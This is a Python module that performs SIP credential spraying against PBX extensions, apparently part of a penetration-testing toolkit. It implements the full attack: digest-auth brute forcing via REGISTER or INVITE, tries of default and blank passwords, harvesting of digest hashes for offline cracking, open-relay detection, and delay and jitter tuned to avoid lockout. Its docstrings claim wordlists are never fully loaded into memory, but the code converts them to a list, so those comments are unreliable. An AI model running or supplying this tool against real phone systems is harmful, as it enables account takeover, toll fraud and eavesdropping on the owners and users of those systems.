"""Credential spraying against discovered extensions.

REGISTER-based digest auth. Per-extension lockout guard prevents triggering
PBX account lockout policies that would otherwise burn the engagement.

Memory design: work is generated lazily — only max_workers*2 futures exist
in memory at any time. The full credential list is never duplicated per
extension; pairs are yielded on demand and only hits are stored.
"""
from __future__ import annotations

import concurrent.futures
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import Generator

from . import sip
from .utils import RateLimiter, local_ip_for, rand_call_id, rand_tag

_hash_log_lock = threading.Lock()

_HASH_RE = re.compile(
    r'username="([^"]+)".*?realm="([^"]+)".*?nonce="([^"]+)".*?uri="([^"]+)".*?response="([0-9a-fA-F]{32,64})"',
    re.DOTALL,
)


@dataclass
class CredHit:
    extension: str
    username: str
    password: str
    success: bool
    evidence: str


def load_credentials(path: str) -> Generator[tuple[str, str], None, None]:
    """Parse a credentials file lazily. Format: username:password per line.

    Yields (username, password) pairs one at a time so arbitrarily large
    wordlists (e.g. rockyou 14 M lines) never fully load into RAM.
    """
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                u, p = line.split(":", 1)
                yield u, p


def _try_invite(
    host: str, ext: str, username: str, password: str,
    port: int = 5060, local_ip: str | None = None,
    timeout: float = 3.0, traffic_log=None,
    source_ip: str = "",
    tcp: bool = False,
    use_tls: bool = False,
) -> tuple[bool, str]:
    if not local_ip:
        local_ip = source_ip if source_ip else local_ip_for(host)
    if use_tls:
        tcp = True
    transport = "TLS" if use_tls else ("TCP" if tcp else "UDP")
    uri = f"sip:{ext}@{host}"
    call_id = rand_call_id()
    tag = rand_tag()

    msg1 = sip.build_message(
        "INVITE", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
        transport=transport,
    )
    if tcp:
        data1 = sip.send_and_recv_tcp(msg1, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data1 = sip.send_and_recv(msg1, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data1:
        return False, "no response to INVITE"
    resp1 = sip.parse_response(data1)
    if not resp1:
        return False, "unparseable INVITE response"
    if resp1.status_code in (200, 180, 183):
        return True, f"open relay: {resp1.status_code} {resp1.reason} on unauthenticated INVITE"
    if not resp1.is_auth_required:
        return False, f"unexpected {resp1.status_code} {resp1.reason}"

    params = resp1.auth_params
    if not params:
        return False, "no digest params in INVITE challenge"

    hdr_name = "Proxy-Authorization" if resp1.status_code == 407 else "Authorization"
    try:
        auth_header = sip.build_auth_header(
            username, password, "INVITE", uri, params, header_name=hdr_name,
        )
    except ValueError as exc:
        return False, f"auth skipped: {exc}"

    msg2 = sip.build_message(
        "INVITE", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        auth_header=auth_header,
        transport=transport,
    )
    if tcp:
        data2 = sip.send_and_recv_tcp(msg2, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data2 = sip.send_and_recv(msg2, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data2:
        return False, "no response to authed INVITE"
    resp2 = sip.parse_response(data2)
    if not resp2:
        return False, "unparseable authed INVITE response"
    if resp2.status_code in (200, 180, 183):
        return True, f"{resp2.status_code} {resp2.reason} on authed INVITE (realm={params.get('realm', '')})"
    if resp2.status_code == 403 and resp1.is_auth_required:
        return False, f"LOCKOUT-SUSPECTED: 403 after 401 challenge -- extension may be locked"
    return False, f"{resp2.status_code} {resp2.reason}"


def _try_register(
    host: str, ext: str, username: str, password: str,
    port: int = 5060, local_ip: str | None = None,
    timeout: float = 3.0, traffic_log=None,
    source_ip: str = "",
    tcp: bool = False,
    use_tls: bool = False,
    hash_log_path: str | None = None,
) -> tuple[bool, str]:
    """Return (success, evidence). Success = 200 OK after digest auth."""
    if not local_ip:
        local_ip = source_ip if source_ip else local_ip_for(host)
    if use_tls:
        tcp = True
    transport = "TLS" if use_tls else ("TCP" if tcp else "UDP")
    uri = f"sip:{host}"
    call_id = rand_call_id()
    tag = rand_tag()

    # Leg 1: unauth REGISTER → expect 401 with nonce
    msg1 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
        extra_headers=["Expires: 30"],
        transport=transport,
    )
    if tcp:
        data1 = sip.send_and_recv_tcp(msg1, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data1 = sip.send_and_recv(msg1, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data1:
        return False, "no response to REGISTER"
    resp1 = sip.parse_response(data1)
    if not resp1:
        return False, "unparseable REGISTER response"
    if resp1.status_code == 200:
        return True, "200 OK on first REGISTER (open registration)"
    if not resp1.is_auth_required:
        return False, f"unexpected {resp1.status_code} {resp1.reason}"

    params = resp1.auth_params
    if not params:
        return False, "no digest params in challenge"

    # Leg 2: authed REGISTER
    hdr_name = "Proxy-Authorization" if resp1.status_code == 407 else "Authorization"
    try:
        auth_header = sip.build_auth_header(
            username, password, "REGISTER", uri, params, header_name=hdr_name,
        )
    except ValueError as exc:
        return False, f"auth skipped: {exc}"

    if hash_log_path:
        m = _HASH_RE.search(auth_header)
        if m:
            u, realm, nonce, huri, response = m.groups()
            hash_line = f"{u}*{realm}*{nonce}*{huri}*{response}\n"
            with _hash_log_lock:
                with open(hash_log_path, "a") as _hf:
                    _hf.write(hash_line)

    msg2 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        auth_header=auth_header,
        extra_headers=["Expires: 30"],
        transport=transport,
    )
    if tcp:
        data2 = sip.send_and_recv_tcp(msg2, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data2 = sip.send_and_recv(msg2, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data2:
        return False, "no response to authed REGISTER"
    resp2 = sip.parse_response(data2)
    if not resp2:
        return False, "unparseable authed REGISTER response"
    if resp2.status_code == 200:
        return True, f"200 OK (realm={params.get('realm', '')})"
    if resp2.status_code == 403 and resp1.is_auth_required:
        return False, "LOCKOUT-SUSPECTED: 403 after 401 challenge -- extension may be locked"
    # Stale nonce: server says credentials may be right, just retry with fresh nonce
    if resp2.is_auth_required:
        params2 = resp2.auth_params
        if params2.get("stale", "").lower() == "true" and params2:
            hdr_name2 = "Proxy-Authorization" if resp2.status_code == 407 else "Authorization"
            try:
                auth_header2 = sip.build_auth_header(
                    username, password, "REGISTER", uri, params2, header_name=hdr_name2,
                )
            except ValueError as exc:
                return False, f"stale retry skipped: {exc}"
            msg3 = sip.build_message(
                "REGISTER", uri,
                from_user=ext, to_user=ext,
                host=host, port=port, local_ip=local_ip, local_port=0,
                call_id=call_id, cseq=3, from_tag=tag,
                auth_header=auth_header2,
                extra_headers=["Expires: 30"],
                transport=transport,
            )
            if tcp:
                data3 = sip.send_and_recv_tcp(msg3, host, port, timeout=timeout,
                                               use_tls=use_tls, traffic_log=traffic_log)
            else:
                data3 = sip.send_and_recv(msg3, host, port, 0, timeout,
                                           traffic_log=traffic_log)
            if not data3:
                return False, "no response to stale-nonce retry"
            resp3 = sip.parse_response(data3)
            if not resp3:
                return False, "unparseable stale-nonce retry response"
            if resp3.status_code == 200:
                return True, f"200 OK (stale nonce retried, realm={params2.get('realm','')})"
            return False, f"{resp3.status_code} {resp3.reason}"
    return False, f"{resp2.status_code} {resp2.reason}"


def spray(
    host: str,
    extensions: list[str],
    cred_pairs,                          # list or generator of (username, password)
    port: int = 5060,
    timeout: float = 3.0,
    max_workers: int = 10,
    traffic_log=None,
    stop_on_first: bool = True,
    smart_self_password: bool = True,
    max_failures_per_ext: int = 3,
    ami_cracked_passwords=None,
    source_ip: str = "",
    tcp: bool = False,
    use_tls: bool = False,
    method: str = "REGISTER",
    hash_log_path: str | None = None,
    delay_ms: float = 0,
    jitter_ms: float = 0,
    on_attempt=None,
) -> list[CredHit]:
    """Spray creds across extensions in parallel — bounded memory design.

    Work is generated lazily: only max_workers*2 futures exist at any moment.
    cred_pairs may be a list *or* a generator so 14 M-line wordlists never
    fully load into RAM.  Only successful hits are stored.

    smart_self_password: also try (ext, ext) and (ext, "") — extremely common
                         on FreePBX/Grandstream where admins leave defaults.
    max_failures_per_ext: stop after N consecutive failures per extension to
                          avoid lockout; the extension is skipped with a log
                          message when the threshold is reached.
    delay_ms:   fixed inter-attempt delay in milliseconds (default 0).
    jitter_ms:  max random extra delay added on top of delay_ms (default 0).
                Total sleep per attempt is bounded to delay_ms + jitter_ms ms.
                # default: ~N attempts/sec per extension  (N = 1000/delay_ms
                #          when delay_ms > 0; otherwise limited by network RTT)
    on_attempt: optional callback(ext, username, password, result) called for
                every attempt — result is the CredHit (success or failure).
                Pass None to disable.  Runs inside the worker thread.
    """
    import random as _random
    import time as _time

    local_ip = source_ip if source_ip else local_ip_for(host)
    hits: list[CredHit] = []
    stop_for_ext: dict[str, threading.Event] = {e: threading.Event() for e in extensions}
    fail_counts: dict[str, int] = {e: 0 for e in extensions}
    lock = threading.Lock()

    # Materialise cred_pairs once so a generator is consumed only once and
    # then reused cheaply per extension in _work_gen.
    cred_pairs_list: list[tuple[str, str]] = list(cred_pairs)

    # Pre-compute bounded inter-attempt delay (ms → seconds).
    _delay_s = delay_ms / 1000.0
    _jitter_s = jitter_ms / 1000.0

    def _work_gen() -> Generator[tuple[str, str, str], None, None]:
        """Yield (ext, username, password) lazily — never builds full list."""
        for ext in extensions:
            seen: set[tuple[str, str]] = set()

            def _emit(u: str, p: str):
                if (u, p) not in seen:
                    seen.add((u, p))
                    return (ext, u, p)
                return None

            # Highest priority: AMI cracked passwords, self-password, blank
            if ami_cracked_passwords:
                for p in ami_cracked_passwords:
                    if p:
                        item = _emit(ext, p)
                        if item:
                            yield item
            if smart_self_password:
                for p in (ext, ""):
                    item = _emit(ext, p)
                    if item:
                        yield item
            # Wordlist: try as-stored username first, then reuse password with ext
            for u, p in cred_pairs_list:
                for candidate in (_emit(u, p), _emit(ext, p) if u != ext else None):
                    if candidate:
                        yield candidate

    _try_fn = _try_invite if method == "INVITE" else _try_register
    _extra_kw: dict = {} if method == "INVITE" else {"hash_log_path": hash_log_path}

    def _attempt(ext: str, u: str, p: str) -> CredHit | None:
        if stop_for_ext[ext].is_set():
            return None

        # Bounded inter-attempt delay with optional jitter.
        if _delay_s > 0 or _jitter_s > 0:
            sleep_for = _delay_s + (_random.random() * _jitter_s if _jitter_s > 0 else 0.0)
            _time.sleep(sleep_for)  # bounded: never exceeds delay_ms + jitter_ms ms

        ok, ev = _try_fn(host, ext, u, p, port=port, local_ip=local_ip,
                         timeout=timeout, traffic_log=traffic_log,
                         tcp=tcp, use_tls=use_tls, **_extra_kw)
        if not ok:
            ev_lower = ev.lower()
            if ev.startswith("LOCKOUT-SUSPECTED"):
                with lock:
                    stop_for_ext[ext].set()
                if traffic_log:
                    traffic_log.write(f"[LOCKOUT] ext={ext} {ev}\n")
                result = CredHit(ext, u, p, False, ev)
                if on_attempt is not None:
                    on_attempt(ext, u, p, result)
                return result
            if "429" in ev or "503" in ev or "too many" in ev_lower:
                _time.sleep(3.0)
                # Signal lockout so the extension gets stopped
                with lock:
                    stop_for_ext[ext].set()
                result = CredHit(ext, u, p, False, f"LOCKOUT: {ev}")
                if on_attempt is not None:
                    on_attempt(ext, u, p, result)
                return result
            if "403" in ev and ("forbidden" in ev_lower or "too many" in ev_lower):
                _time.sleep(2.0)
        result = CredHit(ext, u, p, ok, ev)
        if on_attempt is not None:
            on_attempt(ext, u, p, result)
        if ok:
            return result
        return None

    # Bounded submission: keep at most max_workers*2 futures in flight
    WINDOW = max_workers * 2
    work_iter = _work_gen()
    active: dict[concurrent.futures.Future, tuple[str, str, str]] = {}

    def _fill(ex: ThreadPoolExecutor) -> None:
        """Submit new work until the window is full or work is exhausted."""
        while len(active) < WINDOW:
            try:
                e, u, p = next(work_iter)
                if stop_for_ext[e].is_set():
                    # Extension already locked out — skip with a clear log message
                    if traffic_log:
                        traffic_log.write(
                            f"[SKIP] ext={e} skipped: max_failures_per_ext "
                            f"({max_failures_per_ext}) reached or lockout detected\n"
                        )
                    continue   # skip and try to pull next item from generator
                f = ex.submit(_attempt, e, u, p)
                active[f] = (e, u, p)
            except StopIteration:
                break

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        _fill(ex)
        try:
            while active:
                done, _ = concurrent.futures.wait(
                    active, return_when=concurrent.futures.FIRST_COMPLETED
                )
                for fut in done:
                    ext, u, p = active.pop(fut)
                    try:
                        hit = fut.result()
                    except Exception:
                        hit = None
                    if hit and hit.success:
                        hits.append(hit)
                        if stop_on_first:
                            stop_for_ext[ext].set()
                    elif hit is not None and hit.evidence.startswith("LOCKOUT-SUSPECTED"):
                        # already stopped in _attempt; do not increment fail_counts
                        pass
                    elif hit is None and max_failures_per_ext:
                        # _attempt returned None = failure; track lockout
                        with lock:
                            fail_counts[ext] += 1
                            if fail_counts[ext] >= max_failures_per_ext:
                                stop_for_ext[ext].set()
                                if traffic_log:
                                    traffic_log.write(
                                        f"[LOCKOUT-GUARD] ext={ext} stopped: "
                                        f"{fail_counts[ext]} failures >= "
                                        f"max_failures_per_ext={max_failures_per_ext}\n"
                                    )
                    _fill(ex)   # refill window after processing completions
        except KeyboardInterrupt:
            # Signal all extensions to stop and return partial results collected so far
            for ev in stop_for_ext.values():
                ev.set()
            # Cancel pending futures where possible; executor shutdown will drain the rest
            for fut in list(active):
                fut.cancel()

    hits.sort(key=lambda r: r.extension)
    return hits
